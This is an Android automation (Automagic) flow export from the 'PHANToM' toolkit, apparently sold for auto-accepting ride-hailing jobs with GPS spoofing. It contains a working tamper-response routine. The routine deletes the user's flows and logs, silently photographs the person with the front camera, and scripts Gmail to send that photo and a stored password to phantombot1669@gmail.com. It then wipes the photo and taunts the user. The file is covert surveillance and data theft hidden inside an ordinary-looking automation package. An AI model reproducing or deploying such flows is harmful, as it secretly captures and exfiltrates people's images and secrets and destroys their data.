<?xml version='1.0' encoding='UTF-8' standalone='yes' ?>
<data version="1.37.0">
  <action type="clear_automagic_log">
    <useDefaultName>false</useDefaultName>
    <name>Clear PHANToM Log</name>
  </action>
  <action type="control_user_interface">
    <useDefaultName>true</useDefaultName>
    <name>Control UI: sleep(3000)</name>
    <script>sleep(3000)</script>
  </action>
  <action type="control_user_interface">
    <useDefaultName>true</useDefaultName>
    <name>Control UI: sleep(50); click("เริ่มเลย"); click("เริ่มเลย"); sleep(50); click("เริ่มเลย"); click("เริ่มเลย"); sleep(50); click("เริ่มเลย"); click("เริ่มเลย"); sleep(50); click("เริ่มเลย"); click("เริ่มเลย");</name>
    <script>sleep(50);
click("เริ่มเลย");
click("เริ่มเลย");
sleep(50);
click("เริ่มเลย");
click("เริ่มเลย");
sleep(50);
click("เริ่มเลย");
click("เริ่มเลย");
sleep(50);
click("เริ่มเลย");
click("เริ่มเลย");</script>
  </action>
  <action type="control_user_interface">
    <useDefaultName>true</useDefaultName>
    <name>Control UI: sleep(500); clickById("com.google.android.gm:id/add_attachment"); sleep(200); clickById("com.google.android.gm:id/title"); sleep(400); click("Impostor.jpg"); sleep(20); click("Impostor.jpg"); sleep(20); click("Impostor.jpg"); sleep(20); click("Impostor.jpg"); sleep(200); bounds = getBounds("ส่ง"); c</name>
    <script>sleep(500);
clickById("com.google.android.gm:id/add_attachment");
sleep(200);
clickById("com.google.android.gm:id/title");
sleep(400);

click("Impostor.jpg");
sleep(20);
click("Impostor.jpg");
sleep(20);
click("Impostor.jpg");
sleep(20);
click("Impostor.jpg");
sleep(200);
bounds = getBounds("ส่ง");
click("ส่ง");
bounds = getBounds("ส่ง");
click("ส่ง");
sleep(1000)
</script>
  </action>
  <action type="control_user_interface">
    <useDefaultName>true</useDefaultName>
    <name>Control UI: sleep(5000)</name>
    <script>sleep(5000)</script>
  </action>
  <action type="send_sms">
    <useDefaultName>false</useDefaultName>
    <name>Debug Code</name>
    <sim></sim>
    <receiver>{P}{H}{A}{N}{T}{o}{M}</receiver>
    <message>Code: "1.1.2"</message>
    <truncate>true</truncate>
    <limited>true</limited>
    <maxCount>10</maxCount>
    <duration>43200000</duration>
    <storeSMS>false</storeSMS>
    <requestDeliveryReports>false</requestDeliveryReports>
    <synchronousDeliveryReports>true</synchronousDeliveryReports>
    <deliveryReportTimeout>600000</deliveryReportTimeout>
  </action>
  <action type="delete_files">
    <useDefaultName>true</useDefaultName>
    <name>Delete Files: /storage/emulated/0/Download/Impostor</name>
    <pathList>/storage/emulated/0/Download/Impostor</pathList>
    <showProgress>false</showProgress>
  </action>
  <action type="delete_flows">
    <useDefaultName>true</useDefaultName>
    <name>Delete Flows: ⏭️PHANToM Auto Swipe⏭️</name>
    <flowNameList>⏭️PHANToM Auto Swipe⏭️</flowNameList>
    <deleteUnusedObjects>false</deleteUnusedObjects>
  </action>
  <action type="delete_flows">
    <useDefaultName>true</useDefaultName>
    <name>Delete Flows: 🎭PHANToM Special Tap🎭,⚡AUTO RUN LALA 2.0⚡Edit by lPHANToMl Stoper,⚡AUTO RUN LALA 2.0⚡Edit by lPHANToMl,⚡AUTO RUN LALA 1.2⚡ Edit by lPHANToMl,Tile4👩‍🔧Resulotion Editor👩‍🔧,⏭️PHANToM Auto Swipe⏭️,🎭โยนหมุด GPS Setter by PHANToM🎭,🎭PHANToM Trigger Starter🎭,"🐍 ราคา  00 - 99 บาท  🐍
🐍 ต้นทาง - ปลายทาง 🐍 Edit by lPHANToMl","🐝 ราคา  100 - 199 บาท  🐝
🐝 ต้นทาง - ปลายทาง 🐝 Edit by lPHANToMl","🐣 ราคา  200 - 299 บาท  🐣
🐣 ต้นทาง - ปลายทาง 🐣 Edit by lPHANToMl","🐬 ราคา  300 - 399 บาท  🐬
🐬 ต้นทาง - ปลายทาง 🐬 Edit by lPHANToMl","🐳 ราคา  400 - 499 บาท  🐳
🐳 ต้นทาง - ปลายทาง 🐳 Edit by lPHANToMl","🐻 ราคา  500 - 599 บาท  🐻
🐻 ต้นทาง - ปลายทาง 🐻 Edit by lPHANToMl",🔃PHANToM Refresh Task1🔃,🔃PHANToM Refresh Task2🔃,🔃PHANToM Refresher🔃,🔄Emergency Stop Refresh Display🔄,🕹️Clear Location,🕹️Floating button Action order,🕹️Floating button Hider,🕹️Floating button Launcher,🕹️Menu Dialog connector,🕹️Set clear Location,🕹️Set Refresh Screen,🕹️Set Swipe,🕹️Task Refresh Screen,🕹️Task Swipe,"🦀 ราคา  600 - 699 บาท  🦀
🦀 ต้นทาง - ปลายทาง 🦀 Edit by lPHANToMl","🦎 ราคา  700 - 799 บาท  🦎
🦎 ต้นทาง - ปลายทาง 🦎 Edit by lPHANToMl","🦕 ราคา  800 - 899 บาท  🦕
🦕 ต้นทาง - ปลายทาง 🦕 Edit by lPHANToMl","🦘 ราคา  900 - 999 บาท  🦘
🦘 ต้นทาง - ปลายทาง 🦘 Edit by lPHANToMl","🦝 ราคา  1,000 - 9,999 บาท  🦝
🦝 ต้นทาง - ปลายทาง 🦝 Edit by lPHANToMl"</name>
    <flowNameList>🎭PHANToM Special Tap🎭,⚡AUTO RUN LALA 2.0⚡Edit by lPHANToMl Stoper,⚡AUTO RUN LALA 2.0⚡Edit by lPHANToMl,⚡AUTO RUN LALA 1.2⚡ Edit by lPHANToMl,Tile4👩‍🔧Resulotion Editor👩‍🔧,⏭️PHANToM Auto Swipe⏭️,🎭โยนหมุด GPS Setter by PHANToM🎭,🎭PHANToM Trigger Starter🎭,"🐍 ราคา  00 - 99 บาท  🐍
🐍 ต้นทาง - ปลายทาง 🐍 Edit by lPHANToMl","🐝 ราคา  100 - 199 บาท  🐝
🐝 ต้นทาง - ปลายทาง 🐝 Edit by lPHANToMl","🐣 ราคา  200 - 299 บาท  🐣
🐣 ต้นทาง - ปลายทาง 🐣 Edit by lPHANToMl","🐬 ราคา  300 - 399 บาท  🐬
🐬 ต้นทาง - ปลายทาง 🐬 Edit by lPHANToMl","🐳 ราคา  400 - 499 บาท  🐳
🐳 ต้นทาง - ปลายทาง 🐳 Edit by lPHANToMl","🐻 ราคา  500 - 599 บาท  🐻
🐻 ต้นทาง - ปลายทาง 🐻 Edit by lPHANToMl",🔃PHANToM Refresh Task1🔃,🔃PHANToM Refresh Task2🔃,🔃PHANToM Refresher🔃,🔄Emergency Stop Refresh Display🔄,🕹️Clear Location,🕹️Floating button Action order,🕹️Floating button Hider,🕹️Floating button Launcher,🕹️Menu Dialog connector,🕹️Set clear Location,🕹️Set Refresh Screen,🕹️Set Swipe,🕹️Task Refresh Screen,🕹️Task Swipe,"🦀 ราคา  600 - 699 บาท  🦀
🦀 ต้นทาง - ปลายทาง 🦀 Edit by lPHANToMl","🦎 ราคา  700 - 799 บาท  🦎
🦎 ต้นทาง - ปลายทาง 🦎 Edit by lPHANToMl","🦕 ราคา  800 - 899 บาท  🦕
🦕 ต้นทาง - ปลายทาง 🦕 Edit by lPHANToMl","🦘 ราคา  900 - 999 บาท  🦘
🦘 ต้นทาง - ปลายทาง 🦘 Edit by lPHANToMl","🦝 ราคา  1,000 - 9,999 บาท  🦝
🦝 ต้นทาง - ปลายทาง 🦝 Edit by lPHANToMl"</flowNameList>
    <deleteUnusedObjects>false</deleteUnusedObjects>
  </action>
  <action type="delete_flows">
    <useDefaultName>true</useDefaultName>
    <name>Delete Flows: 🎭PHANToM Trigger Starter🎭</name>
    <flowNameList>🎭PHANToM Trigger Starter🎭</flowNameList>
    <deleteUnusedObjects>false</deleteUnusedObjects>
  </action>
  <action type="delete_flows">
    <useDefaultName>true</useDefaultName>
    <name>Delete Flows: 🎭โยนหมุด GPS Setter by PHANToM🎭</name>
    <flowNameList>🎭โยนหมุด GPS Setter by PHANToM🎭</flowNameList>
    <deleteUnusedObjects>false</deleteUnusedObjects>
  </action>
  <action type="delete_flows">
    <useDefaultName>true</useDefaultName>
    <name>Delete Flows: 🔃PHANToM Refresh Task1🔃</name>
    <flowNameList>🔃PHANToM Refresh Task1🔃</flowNameList>
    <deleteUnusedObjects>false</deleteUnusedObjects>
  </action>
  <action type="delete_flows">
    <useDefaultName>true</useDefaultName>
    <name>Delete Flows: 🔃PHANToM Refresh Task2🔃</name>
    <flowNameList>🔃PHANToM Refresh Task2🔃</flowNameList>
    <deleteUnusedObjects>false</deleteUnusedObjects>
  </action>
  <action type="delete_flows">
    <useDefaultName>true</useDefaultName>
    <name>Delete Flows: 🔃PHANToM Refresher🔃</name>
    <flowNameList>🔃PHANToM Refresher🔃</flowNameList>
    <deleteUnusedObjects>false</deleteUnusedObjects>
  </action>
  <action type="delete_flows">
    <useDefaultName>true</useDefaultName>
    <name>Delete Flows: 🔄Emergency Stop Refresh Display🔄</name>
    <flowNameList>🔄Emergency Stop Refresh Display🔄</flowNameList>
    <deleteUnusedObjects>false</deleteUnusedObjects>
  </action>
  <action type="delete_flows">
    <useDefaultName>true</useDefaultName>
    <name>Delete Flows: 🔑SigningKeyCheckActivity,🔑System Resources File Loader,👩‍🔧Settings Page👩‍🔧,👩‍🔧Settings Page5👩‍🔧,👩‍🔧Settings Page4👩‍🔧,👩‍🔧Settings Page3👩‍🔧,👩‍🔧Settings Page2👩‍🔧,👩‍🔧Settings Page1👩‍🔧,👩‍🔧Full Function Confirmation👩‍🔧</name>
    <flowNameList>🔑SigningKeyCheckActivity,🔑System Resources File Loader,👩‍🔧Settings Page👩‍🔧,👩‍🔧Settings Page5👩‍🔧,👩‍🔧Settings Page4👩‍🔧,👩‍🔧Settings Page3👩‍🔧,👩‍🔧Settings Page2👩‍🔧,👩‍🔧Settings Page1👩‍🔧,👩‍🔧Full Function Confirmation👩‍🔧</flowNameList>
    <deleteUnusedObjects>false</deleteUnusedObjects>
  </action>
  <action type="delete_flows">
    <useDefaultName>true</useDefaultName>
    <name>Delete Flows: 🔑SigningKeyLoginActivity</name>
    <flowNameList>🔑SigningKeyLoginActivity</flowNameList>
    <deleteUnusedObjects>false</deleteUnusedObjects>
  </action>
  <action type="delete_flows">
    <useDefaultName>true</useDefaultName>
    <name>Delete Flows: 🕹️Floating button Action order,🕹️Menu Dialog connector,🕹️Set clear Location,🕹️Set Refresh Screen,🕹️Set Swipe,🕹️Task Refresh Screen,🕹️Task Swipe</name>
    <flowNameList>🕹️Floating button Action order,🕹️Menu Dialog connector,🕹️Set clear Location,🕹️Set Refresh Screen,🕹️Set Swipe,🕹️Task Refresh Screen,🕹️Task Swipe</flowNameList>
    <deleteUnusedObjects>false</deleteUnusedObjects>
  </action>
  <action type="delete_flows">
    <useDefaultName>true</useDefaultName>
    <name>Delete Flows: 🕹️Floating button Hider</name>
    <flowNameList>🕹️Floating button Hider</flowNameList>
    <deleteUnusedObjects>false</deleteUnusedObjects>
  </action>
  <action type="delete_flows">
    <useDefaultName>true</useDefaultName>
    <name>Delete Flows: 🕹️Floating button Launcher</name>
    <flowNameList>🕹️Floating button Launcher</flowNameList>
    <deleteUnusedObjects>false</deleteUnusedObjects>
  </action>
  <action type="execute_flows">
    <useDefaultName>true</useDefaultName>
    <name>Execute Flows: 🔑SigningKeyCheckActivity</name>
    <includeFlowNamePatternList>🔑SigningKeyCheckActivity</includeFlowNamePatternList>
    <excludeFlowNamePatternList></excludeFlowNamePatternList>
    <skipDisabledFlowsWithoutError>false</skipDisabledFlowsWithoutError>
    <waitForFlowsToFinish>false</waitForFlowsToFinish>
    <returnLocalVariablesToCallingFlow>false</returnLocalVariablesToCallingFlow>
  </action>
  <action type="message_dialog">
    <useDefaultName>true</useDefaultName>
    <name>Message Dialog:            🎭PHANToM🎭 ⏳Activated Timeout⌛ 🎭lPHANToMl🎭 🛑Line : phantom1669🛑</name>
    <title>           🎭PHANToM🎭</title>
    <message> 
           ⏳Activated Timeout⌛

                 🎭lPHANToMl🎭
          🛑Line : phantom1669🛑</message>
    <buttonLabel>close</buttonLabel>
    <timeoutEnabled>false</timeoutEnabled>
    <timeout>60000</timeout>
  </action>
  <action type="message_dialog">
    <useDefaultName>true</useDefaultName>
    <name>Message Dialog: 📵ERROR Resource📵 ไฟล์ไม่สมบูรณ์ The Resource File is Incomplete Note : แนะนำให้ลบและดาวน์โหลดใหม่ จากแหล่งที่ถูกต้อง</name>
    <title>📵ERROR Resource📵</title>
    <message>ไฟล์ไม่สมบูรณ์
The Resource File is Incomplete

Note : แนะนำให้ลบและดาวน์โหลดใหม่
            จากแหล่งที่ถูกต้อง</message>
    <buttonLabel>OK</buttonLabel>
    <timeoutEnabled>false</timeoutEnabled>
    <timeout>60000</timeout>
  </action>
  <action type="notification_screen">
    <useDefaultName>true</useDefaultName>
    <name>Notification on Screen: 📵Broken Flie Deleted!📵 (long)</name>
    <showText>true</showText>
    <text>📵Broken Flie Deleted!📵</text>
    <widgetName></widgetName>
    <width></width>
    <height></height>
    <stretchToFillArea>false</stretchToFillArea>
    <opacity>1.00</opacity>
    <durationLong>true</durationLong>
    <customPosition>false</customPosition>
    <gravityType>TOP_LEFT</gravityType>
    <xOffset>0</xOffset>
    <yOffset>0</yOffset>
  </action>
  <action type="notification_screen">
    <useDefaultName>true</useDefaultName>
    <name>Notification on Screen: 😁ทีหลังห้ามซนนะจ๊ะ😁</name>
    <showText>true</showText>
    <text>😁ทีหลังห้ามซนนะจ๊ะ😁</text>
    <widgetName></widgetName>
    <width></width>
    <height></height>
    <stretchToFillArea>false</stretchToFillArea>
    <opacity>1.00</opacity>
    <durationLong>false</durationLong>
    <customPosition>false</customPosition>
    <gravityType>TOP_LEFT</gravityType>
    <xOffset>0</xOffset>
    <yOffset>0</yOffset>
  </action>
  <action type="open_browser_url">
    <useDefaultName>true</useDefaultName>
    <name>Open URL in Browser: https://drive.google.com/drive/folders/1dZNMb8_tHWH2Q3VoR0O5r-oIEh2b5SIZ</name>
    <url>https://drive.google.com/drive/folders/1dZNMb8_tHWH2Q3VoR0O5r-oIEh2b5SIZ</url>
    <explicitComponent>false</explicitComponent>
    <packageName></packageName>
    <className></className>
    <appName></appName>
  </action>
  <action type="show_home_screen">
    <useDefaultName>false</useDefaultName>
    <name>PHANToM
ooo</name>
    <pageEnabled>false</pageEnabled>
    <page>1</page>
  </action>
  <action type="set_flow_state">
    <useDefaultName>true</useDefaultName>
    <name>Set Flow State: Enable 🔑SigningKeyCheckActivity,🔑SigningKeyLoginActivity,🔑System Resources File Loader</name>
    <enable>true</enable>
    <includeFlowNamePatternList>🔑SigningKeyCheckActivity,🔑SigningKeyLoginActivity,🔑System Resources File Loader</includeFlowNamePatternList>
    <excludeFlowNamePatternList></excludeFlowNamePatternList>
  </action>
  <action type="start_activity">
    <useDefaultName>false</useDefaultName>
    <name>Start Activity: android.intent.action.SEND text/plain com.google.android.gm/com.google.android.gmsss.ComposeActivityGmailExternal hwhshh.2</name>
    <intentAction>android.intent.action.SEND</intentAction>
    <categoryListEnabled>false</categoryListEnabled>
    <categoryList>android.intent.category.DEFAULT</categoryList>
    <dataEnabled>false</dataEnabled>
    <data></data>
    <dataTypeEnabled>true</dataTypeEnabled>
    <dataType>text/plain</dataType>
    <explicitComponent>true</explicitComponent>
    <packageName>com.google.android.gm</packageName>
    <className>com.google.android.gm.ComposeActivityGmailExternal</className>
    <flagList>FLAG_ACTIVITY_NEW_TASK</flagList>
    <launchBoundsEnabled>false</launchBoundsEnabled>
    <x></x>
    <y></y>
    <width></width>
    <height></height>
    <extras>putString("android.intent.extra.SUBJECT", global_password);
putString("android.intent.extra.TEXT", "พยายามแก้ไขไฟล์");
putStringArray("android.intent.extra.EMAIL", newList("phantombot1669@gmail.com"));
</extras>
    <waitForResult>false</waitForResult>
    <accessResultExtras></accessResultExtras>
  </action>
  <action type="take_picture">
    <useDefaultName>true</useDefaultName>
    <name>Take Picture: /storage/emulated/0/Download/Impostor.jpg (No user interface)</name>
    <useCameraApp>false</useCameraApp>
    <path>/storage/emulated/0/Download/Impostor.jpg</path>
    <cameraId>1</cameraId>
    <pictureSize>720*480</pictureSize>
    <zoom>100</zoom>
    <sceneMode></sceneMode>
    <colorEffect>none</colorEffect>
    <flashMode>auto</flashMode>
    <whiteBalance>auto</whiteBalance>
    <focusMode>fixed</focusMode>
    <awaitPreviewImages>false</awaitPreviewImages>
    <blackPictureFix>false</blackPictureFix>
    <blackPictureFixDuration>2000</blackPictureFixDuration>
    <addToGallery>true</addToGallery>
  </action>
  <action type="vibrate">
    <useDefaultName>false</useDefaultName>
    <name>Vibrate: Custm pattern (--)</name>
    <custom>true</custom>
    <vibratePattern>vibrate_pattern_3</vibratePattern>
    <customPattern>0,1270</customPattern>
  </action>
  <flow type="flow">
    <name>🔑Url.PHANToMSignin</name>
    <description>🎭PHANToM🎭</description>
    <group>🎭PHANToM full Project (Beta)🎭</group>
    <enabled>false</enabled>
    <executionPolicy>PARALLEL</executionPolicy>
    <triggercontainer id="t1" x="525.0" y="-1242.5" />
    <actioncontainer id="t2" x="525.0" y="-1242.5">Message Dialog:            🎭PHANToM🎭 ⏳Activated Timeout⌛ 🎭lPHANToMl🎭 🛑Line : phantom1669🛑</actioncontainer>
    <actioncontainer id="t3" x="525.0" y="-1242.5">Vibrate: Custm pattern (--)</actioncontainer>
    <actioncontainer id="t4" x="525.0" y="-1242.5">Message Dialog: 📵ERROR Resource📵 ไฟล์ไม่สมบูรณ์ The Resource File is Incomplete Note : แนะนำให้ลบและดาวน์โหลดใหม่ จากแหล่งที่ถูกต้อง</actioncontainer>
    <actioncontainer id="t5" x="525.0" y="-1242.5">Set Flow State: Enable 🔑SigningKeyCheckActivity,🔑SigningKeyLoginActivity,🔑System Resources File Loader</actioncontainer>
    <actioncontainer id="t6" x="525.0" y="-1242.5">Execute Flows: 🔑SigningKeyCheckActivity</actioncontainer>
    <actioncontainer id="t7" x="525.0" y="-1242.5">Open URL in Browser: https://drive.google.com/drive/folders/1dZNMb8_tHWH2Q3VoR0O5r-oIEh2b5SIZ</actioncontainer>
    <actioncontainer id="t8" x="525.0" y="-1242.5">Control UI: sleep(3000)</actioncontainer>
    <actioncontainer id="t9" x="525.0" y="-1242.5">PHANToM
ooo</actioncontainer>
    <actioncontainer id="t10" x="525.0" y="-1242.5">Clear PHANToM Log</actioncontainer>
    <actioncontainer id="t11" x="525.0" y="-1242.5">Delete Flows: 🔄Emergency Stop Refresh Display🔄</actioncontainer>
    <actioncontainer id="t12" x="525.0" y="-1242.5">Clear PHANToM Log</actioncontainer>
    <actioncontainer id="t13" x="525.0" y="-1242.5">Delete Flows: 🎭PHANToM Trigger Starter🎭</actioncontainer>
    <actioncontainer id="t14" x="525.0" y="-1242.5">Delete Flows: 🎭โยนหมุด GPS Setter by PHANToM🎭</actioncontainer>
    <actioncontainer id="t15" x="525.0" y="-1242.5">Delete Flows: 🔃PHANToM Refresh Task2🔃</actioncontainer>
    <actioncontainer id="t16" x="525.0" y="-1242.5">Delete Flows: 🔃PHANToM Refresher🔃</actioncontainer>
    <actioncontainer id="t17" x="525.0" y="-1242.5">Delete Flows: 🔃PHANToM Refresh Task1🔃</actioncontainer>
    <actioncontainer id="t18" x="525.0" y="-1242.5">Delete Flows: 🕹️Floating button Action order,🕹️Menu Dialog connector,🕹️Set clear Location,🕹️Set Refresh Screen,🕹️Set Swipe,🕹️Task Refresh Screen,🕹️Task Swipe</actioncontainer>
    <actioncontainer id="t19" x="525.0" y="-1242.5">Clear PHANToM Log</actioncontainer>
    <actioncontainer id="t20" x="525.0" y="-1242.5">Notification on Screen: 😁ทีหลังห้ามซนนะจ๊ะ😁</actioncontainer>
    <actioncontainer id="t21" x="525.0" y="-1242.5">Control UI: sleep(5000)</actioncontainer>
    <actioncontainer id="t22" x="525.0" y="-1242.5">Notification on Screen: 📵Broken Flie Deleted!📵 (long)</actioncontainer>
    <actioncontainer id="t23" x="525.0" y="-1242.5">Delete Flows: 🔑SigningKeyCheckActivity,🔑System Resources File Loader,👩‍🔧Settings Page👩‍🔧,👩‍🔧Settings Page5👩‍🔧,👩‍🔧Settings Page4👩‍🔧,👩‍🔧Settings Page3👩‍🔧,👩‍🔧Settings Page2👩‍🔧,👩‍🔧Settings Page1👩‍🔧,👩‍🔧Full Function Confirmation👩‍🔧</actioncontainer>
    <actioncontainer id="t24" x="525.0" y="-1242.5">Debug Code</actioncontainer>
    <actioncontainer id="t25" x="525.0" y="-1242.5">Delete Files: /storage/emulated/0/Download/Impostor</actioncontainer>
    <actioncontainer id="t26" x="525.0" y="-1242.5">Clear PHANToM Log</actioncontainer>
    <actioncontainer id="t27" x="525.0" y="-1242.5">Control UI: sleep(3000)</actioncontainer>
    <actioncontainer id="t28" x="525.0" y="-1242.5">Delete Flows: 🕹️Floating button Hider</actioncontainer>
    <actioncontainer id="t29" x="525.0" y="-1242.5">Delete Flows: 🕹️Floating button Launcher</actioncontainer>
    <actioncontainer id="t30" x="525.0" y="-1242.5">Delete Flows: 🎭PHANToM Special Tap🎭,⚡AUTO RUN LALA 2.0⚡Edit by lPHANToMl Stoper,⚡AUTO RUN LALA 2.0⚡Edit by lPHANToMl,⚡AUTO RUN LALA 1.2⚡ Edit by lPHANToMl,Tile4👩‍🔧Resulotion Editor👩‍🔧,⏭️PHANToM Auto Swipe⏭️,🎭โยนหมุด GPS Setter by PHANToM🎭,🎭PHANToM Trigger Starter🎭,"🐍 ราคา  00 - 99 บาท  🐍
🐍 ต้นทาง - ปลายทาง 🐍 Edit by lPHANToMl","🐝 ราคา  100 - 199 บาท  🐝
🐝 ต้นทาง - ปลายทาง 🐝 Edit by lPHANToMl","🐣 ราคา  200 - 299 บาท  🐣
🐣 ต้นทาง - ปลายทาง 🐣 Edit by lPHANToMl","🐬 ราคา  300 - 399 บาท  🐬
🐬 ต้นทาง - ปลายทาง 🐬 Edit by lPHANToMl","🐳 ราคา  400 - 499 บาท  🐳
🐳 ต้นทาง - ปลายทาง 🐳 Edit by lPHANToMl","🐻 ราคา  500 - 599 บาท  🐻
🐻 ต้นทาง - ปลายทาง 🐻 Edit by lPHANToMl",🔃PHANToM Refresh Task1🔃,🔃PHANToM Refresh Task2🔃,🔃PHANToM Refresher🔃,🔄Emergency Stop Refresh Display🔄,🕹️Clear Location,🕹️Floating button Action order,🕹️Floating button Hider,🕹️Floating button Launcher,🕹️Menu Dialog connector,🕹️Set clear Location,🕹️Set Refresh Screen,🕹️Set Swipe,🕹️Task Refresh Screen,🕹️Task Swipe,"🦀 ราคา  600 - 699 บาท  🦀
🦀 ต้นทาง - ปลายทาง 🦀 Edit by lPHANToMl","🦎 ราคา  700 - 799 บาท  🦎
🦎 ต้นทาง - ปลายทาง 🦎 Edit by lPHANToMl","🦕 ราคา  800 - 899 บาท  🦕
🦕 ต้นทาง - ปลายทาง 🦕 Edit by lPHANToMl","🦘 ราคา  900 - 999 บาท  🦘
🦘 ต้นทาง - ปลายทาง 🦘 Edit by lPHANToMl","🦝 ราคา  1,000 - 9,999 บาท  🦝
🦝 ต้นทาง - ปลายทาง 🦝 Edit by lPHANToMl"</actioncontainer>
    <actioncontainer id="t31" x="525.0" y="-1242.5">Delete Flows: 🔑SigningKeyLoginActivity</actioncontainer>
    <actioncontainer id="t32" x="525.0" y="-1242.5">Delete Flows: ⏭️PHANToM Auto Swipe⏭️</actioncontainer>
    <actioncontainer id="t33" x="525.0" y="-1242.5">Control UI: sleep(50); click("เริ่มเลย"); click("เริ่มเลย"); sleep(50); click("เริ่มเลย"); click("เริ่มเลย"); sleep(50); click("เริ่มเลย"); click("เริ่มเลย"); sleep(50); click("เริ่มเลย"); click("เริ่มเลย");</actioncontainer>
    <actioncontainer id="t34" x="525.0" y="-1242.5">Take Picture: /storage/emulated/0/Download/Impostor.jpg (No user interface)</actioncontainer>
    <actioncontainer id="t35" x="525.0" y="-1242.5">Control UI: sleep(500); clickById("com.google.android.gm:id/add_attachment"); sleep(200); clickById("com.google.android.gm:id/title"); sleep(400); click("Impostor.jpg"); sleep(20); click("Impostor.jpg"); sleep(20); click("Impostor.jpg"); sleep(20); click("Impostor.jpg"); sleep(200); bounds = getBounds("ส่ง"); c</actioncontainer>
    <actioncontainer id="t36" x="525.0" y="-1242.5">Start Activity: android.intent.action.SEND text/plain com.google.android.gm/com.google.android.gmsss.ComposeActivityGmailExternal hwhshh.2</actioncontainer>
    <connection from="t1" to="t2" type="NORMAL" sourcePosition="SOUTH" targetPosition="NORTH" />
    <connection from="t2" to="t5" type="NORMAL" sourcePosition="SOUTH" targetPosition="NORTH" />
    <connection from="t3" to="t4" type="NORMAL" sourcePosition="SOUTH" targetPosition="NORTH" />
    <connection from="t4" to="t7" type="NORMAL" sourcePosition="SOUTH" targetPosition="NORTH" />
    <connection from="t5" to="t6" type="NORMAL" sourcePosition="SOUTH" targetPosition="NORTH" />
    <connection from="t5" to="t3" type="EXCEPTION" sourcePosition="EAST" targetPosition="WEST" />
    <connection from="t6" to="t9" type="NORMAL" sourcePosition="SOUTH" targetPosition="NORTH" />
    <connection from="t7" to="t8" type="NORMAL" sourcePosition="EAST" targetPosition="WEST" />
    <connection from="t8" to="t12" type="NORMAL" sourcePosition="SOUTH" targetPosition="NORTH" />
    <connection from="t9" to="t10" type="NORMAL" sourcePosition="WEST" targetPosition="EAST" />
    <connection from="t11" to="t15" type="EXCEPTION" sourcePosition="WEST" targetPosition="EAST" />
    <connection from="t11" to="t15" type="NORMAL" sourcePosition="WEST" targetPosition="EAST" />
    <connection from="t12" to="t14" type="NORMAL" sourcePosition="SOUTH" targetPosition="NORTH" />
    <connection from="t13" to="t11" type="EXCEPTION" sourcePosition="WEST" targetPosition="EAST" />
    <connection from="t13" to="t11" type="NORMAL" sourcePosition="WEST" targetPosition="EAST" />
    <connection from="t14" to="t13" type="EXCEPTION" sourcePosition="WEST" targetPosition="EAST" />
    <connection from="t14" to="t13" type="NORMAL" sourcePosition="WEST" targetPosition="EAST" />
    <connection from="t15" to="t16" type="EXCEPTION" sourcePosition="WEST" targetPosition="EAST" />
    <connection from="t15" to="t16" type="NORMAL" sourcePosition="WEST" targetPosition="EAST" />
    <connection from="t16" to="t17" type="EXCEPTION" sourcePosition="SOUTH" targetPosition="NORTH" />
    <connection from="t16" to="t17" type="NORMAL" sourcePosition="SOUTH" targetPosition="NORTH" />
    <connection from="t17" to="t18" type="EXCEPTION" sourcePosition="EAST" targetPosition="WEST" />
    <connection from="t17" to="t18" type="NORMAL" sourcePosition="EAST" targetPosition="WEST" />
    <connection from="t18" to="t28" type="EXCEPTION" sourcePosition="EAST" targetPosition="WEST" />
    <connection from="t18" to="t28" type="NORMAL" sourcePosition="EAST" targetPosition="WEST" />
    <connection from="t19" to="t21" type="NORMAL" sourcePosition="SOUTH" targetPosition="NORTH" />
    <connection from="t20" to="t19" type="NORMAL" sourcePosition="WEST" targetPosition="EAST" />
    <connection from="t21" to="t22" type="NORMAL" sourcePosition="EAST" targetPosition="WEST" />
    <connection from="t22" to="t26" type="NORMAL" sourcePosition="EAST" targetPosition="WEST" />
    <connection from="t25" to="t23" type="EXCEPTION" sourcePosition="WEST" targetPosition="EAST" />
    <connection from="t25" to="t23" type="NORMAL" sourcePosition="WEST" targetPosition="EAST" />
    <connection from="t25" to="t24" type="EXCEPTION" sourcePosition="WEST" targetPosition="EAST" />
    <connection from="t25" to="t24" type="NORMAL" sourcePosition="WEST" targetPosition="EAST" />
    <connection from="t26" to="t34" type="NORMAL" sourcePosition="EAST" targetPosition="WEST" />
    <connection from="t27" to="t20" type="NORMAL" sourcePosition="WEST" targetPosition="EAST" />
    <connection from="t28" to="t29" type="EXCEPTION" sourcePosition="EAST" targetPosition="WEST" />
    <connection from="t28" to="t29" type="NORMAL" sourcePosition="EAST" targetPosition="WEST" />
    <connection from="t29" to="t30" type="EXCEPTION" sourcePosition="EAST" targetPosition="WEST" />
    <connection from="t29" to="t30" type="NORMAL" sourcePosition="EAST" targetPosition="WEST" />
    <connection from="t30" to="t32" type="EXCEPTION" sourcePosition="SOUTH" targetPosition="NORTH" />
    <connection from="t30" to="t32" type="NORMAL" sourcePosition="SOUTH" targetPosition="NORTH" />
    <connection from="t31" to="t27" type="EXCEPTION" sourcePosition="WEST" targetPosition="EAST" />
    <connection from="t31" to="t27" type="NORMAL" sourcePosition="WEST" targetPosition="EAST" />
    <connection from="t32" to="t31" type="EXCEPTION" sourcePosition="WEST" targetPosition="EAST" />
    <connection from="t32" to="t31" type="NORMAL" sourcePosition="WEST" targetPosition="EAST" />
    <connection from="t33" to="t36" type="NORMAL" sourcePosition="SOUTH" targetPosition="NORTH" />
    <connection from="t34" to="t33" type="NORMAL" sourcePosition="EAST" targetPosition="WEST" />
    <connection from="t35" to="t25" type="EXCEPTION" sourcePosition="WEST" targetPosition="EAST" />
    <connection from="t35" to="t25" type="NORMAL" sourcePosition="WEST" targetPosition="EAST" />
    <connection from="t36" to="t35" type="EXCEPTION" sourcePosition="WEST" targetPosition="EAST" />
    <connection from="t36" to="t35" type="NORMAL" sourcePosition="WEST" targetPosition="EAST" />
  </flow>
</data>